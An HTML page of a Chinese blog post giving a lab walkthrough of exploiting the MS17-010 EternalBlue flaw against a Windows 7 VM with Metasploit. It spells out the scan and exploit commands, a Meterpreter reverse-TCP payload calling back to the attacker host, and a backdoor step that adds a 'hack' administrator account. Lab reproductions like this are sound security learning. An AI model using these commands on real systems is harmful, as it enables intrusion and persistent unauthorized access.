@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>永恒之蓝漏洞利用 | 北轨的博客</title><meta name="keywords" content="漏洞复现"><meta name="author" content="北轨"><meta name="copyright" content="北轨"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一，工具及靶机准备 1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机），使用wireshark进行抓包 2.设置kali 的IP地址为自动获取，查看kali IP地址：ifconfig  可以看到kali 的IP地址是192.168.223.137 3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝漏洞利用">
+<meta property="og:url" content="http://www.beigui.xyz/2020/06/26/MS17-010/index.html">
+<meta property="og:site_name" content="北轨的博客">
+<meta property="og:description" content="一，工具及靶机准备 1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机），使用wireshark进行抓包 2.设置kali 的IP地址为自动获取，查看kali IP地址：ifconfig  可以看到kali 的IP地址是192.168.223.137 3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg">
+<meta property="article:published_time" content="2020-06-26T08:28:31.000Z">
+<meta property="article:modified_time" content="2020-06-30T12:24:17.093Z">
+<meta property="article:author" content="北轨">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.beigui.xyz/2020/06/26/MS17-010/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '永恒之蓝漏洞利用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2020-06-30 20:24:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">北轨的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">永恒之蓝漏洞利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-26T08:28:31.000Z" title="发表于 2020-06-26 16:28:31">2020-06-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-06-30T12:24:17.093Z" title="更新于 2020-06-30 20:24:17">2020-06-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="永恒之蓝漏洞利用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>一，工具及靶机准备</strong></p>
+<p>1.使用kali 和windows 7旗舰版（kali作为攻击主机，windows 7旗舰版作为靶机），使用wireshark进行抓包</p>
+<p>2.设置kali 的IP地址为自动获取，查看kali IP地址：ifconfig</p>
+<p> 可以看到kali 的IP地址是192.168.223.137</p>
+<p>3.设置windows 7的IP地址为自动获取，查看windows 7的IP地址：ipconfig</p>
+<p>可以看见windows 7 的IP地址为192.168.223.141</p>
+<p><strong>二，实验步骤：</strong></p>
+<p>1.测试两台主机的连通性：用kali 去Ping windows 7的主机，来测试连通性：ping 192.168.223.141</p>
+<p>可以看见两台主机连通性良好</p>
+<p> 2.查看kali 主机数据库是否开启：service postgresql status</p>
+<p>由上图可以看出：Active：inactive （dead）说明数据库此时是关闭的；</p>
+<p>3.打开kali 主机的数据库： service postgresql start</p>
+<p>4.再次查看kali 主机的数据库：service postgresql status</p>
+<p>由上图可以看出：Active：active （exited）说明此时数据库已经打开</p>
+<p>5.进行msfdb 数据库初始化，配置数据库相关信息：msfdb init</p>
+<p>​    此时就可以进行永恒之蓝漏洞扫描，（永恒之蓝利用的是ms17_010漏洞，因此到这一步之后的任务就是在kali 里寻找ms17_010漏洞，并且利用该漏洞进行攻击，获得windows 7 的管理员权限）</p>
+<p>6.启动msf：msfconsole</p>
+<p>这样就成功进入了msf中，如果你的界面与该界面不同，不必诧异，msf每次都会有一个随机的界面</p>
+<p>7.查看数据库连接情况：在msf命令提示符下：db_status(下面的msf命令提示符也说明了已经进入了msf中)</p>
+<p>postgresql connected to msf 说明已经成功连接到了msf</p>
+<p>8.搜索ms17_010:search ms17_010</p>
+<p>​    小提示：如果第一次输入search ms17_010时并没有出现如上图所示的界面，那么再次输入search ms17_010(本人当时就是输入了两遍才出来如图所示界面，所以多尝试几次)如果多次还是没有发现上述界面，那么有可能是kali 版本太低，没有ms17_010漏洞，所以建议安装更新版本的kali</p>
+<p>9.使用ms17_010模块进行漏洞扫描，在此我使用的是下面两条命令（其他的命令也可以进行ms17_010漏洞扫描,但是能否获得系统权限就不得而知了，有兴趣可以进行实验）</p>
+<p>扫描命令：use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</p>
+<p>攻击命令（后面使用）：use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p>
+<p>10.此时如果不知道应该使用什么命令，则输入options来获得帮助</p>
+<p>​    在此，只关注两个命令：RHOSTS和THREADS，RHOSTS是要扫描的主机（主机段），THREADS是线程，默认是1，开始使用线程加快扫描</p>
+<p>11.设置扫描的主机或者主机段（由于靶机IP地址是192.168.223.141，因此设置扫描主机段为192.168.223.141&#x2F;24）：set rhosts 192.168.223.141&#x2F;24;然后设置扫描线程为20；最后输入run执行扫描。与此同时，在kali里面打开wireshark抓包工具（新建一个终端，输入wireshark即可），监听ethO</p>
+<p> 由上图可以看出，扫描出来存在ms17_010漏洞的主机，也恰好是我的靶机</p>
+<p>通过跟踪TCP流，得到了靶机的基本信息：操作系统是windows 7，IP地址是192.168.223.141，协议为SMB2</p>
+<p>12.进行攻击：use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p>
+<p>设置攻击目标（靶机）：set rhost 192.168.223.141</p>
+<p>设置攻击载荷：set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>设置监听主机（kali）：set lhost 192.168.223.137</p>
+<p>利用exploit进行攻击：exploit</p>
+<p>攻击之后如下图所示：</p>
+<p>​    可以看到监听（kali）IP（192.168.223.137）及端口（4444），被攻击主机（192.168.223.141）及端口（49159）之间已经建立了连接</p>
+<p><strong>三、持续攻击（种植后门）</strong></p>
+<p>1.显示远程主机系统信息：sysinfo</p>
+<p>2.查看用户身份：getuid</p>
+<p>3.对远程主机当前屏幕进行截图：screenshot</p>
+<p>打开截图所在位置：</p>
+<p>4.获得shell控制台：shell</p>
+<p>上面显示转到C:\Windows\system32目录下，说明已经获得了shell的控制权。</p>
+<p>5.进行后门植入（创建新的管理员账户）</p>
+<p>   net user hack 123456 &#x2F;add    &#x2F;&#x2F;在windows 7上创建一个hack的用户，以便下次访问</p>
+<p>   net localgroup administrators hack &#x2F;add   &#x2F;&#x2F;将hack加入到windows 7的本地管理员组中，以便获得更大权限</p>
+<p>   net user    &#x2F;&#x2F;查看windows 7本地用户</p>
+<p>   net localgroup administrators    &#x2F;&#x2F;查看windows 7本地管理员</p>
+<p> 由上图可以看出来，的确将hack添加到windows 7 中，这样可以方便下次继续访问</p>
+<p>​    自此，利用永恒之蓝漏洞攻击一台主机就结束了，现在只有一些低版本的电脑没有打ms17_010的补丁，windows7 以上版本几乎都没有这个漏洞了。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://www.beigui.xyz">北轨</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.beigui.xyz/2020/06/26/MS17-010/">http://www.beigui.xyz/2020/06/26/MS17-010/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.beigui.xyz" target="_blank">北轨的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/06/30/HCNA1/"><img class="prev-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HCNA网络学习指南复习（一）</div></div></a></div><div class="next-post pull-right"><a href="/2020/06/26/Nmap/"><img class="next-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Nmap常用命令</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/bei-gui/image/master/image/20220510222240.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">北轨</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/bei-gui"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/bei-gui" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1769606485@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，一个记录生活小天地</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2022/05/10/hello-world/" title="Hello World">Hello World</a><time datetime="2022-05-10T09:18:10.744Z" title="发表于 2022-05-10 17:18:10">2022-05-10</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/05/09/upload_labs/" title="upload-labs通关笔记">upload-labs通关笔记</a><time datetime="2022-05-09T11:19:53.000Z" title="发表于 2022-05-09 19:19:53">2022-05-09</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2022/01/23/Stm32-car/" title="基于STM32的蓝牙小车">基于STM32的蓝牙小车</a><time datetime="2022-01-23T10:35:58.000Z" title="发表于 2022-01-23 18:35:58">2022-01-23</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/11/15/esp8266/" title="esp8266制作外星人时钟">esp8266制作外星人时钟</a><time datetime="2021-11-15T03:11:36.000Z" title="发表于 2021-11-15 11:11:36">2021-11-15</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/07/24/swordctf-wp/" title="sword战队选拔赛部分WP">sword战队选拔赛部分WP</a><time datetime="2021-07-24T10:41:54.000Z" title="发表于 2021-07-24 18:41:54">2021-07-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/05/10/BGYIv4eOVU9SMF5.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 北轨</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
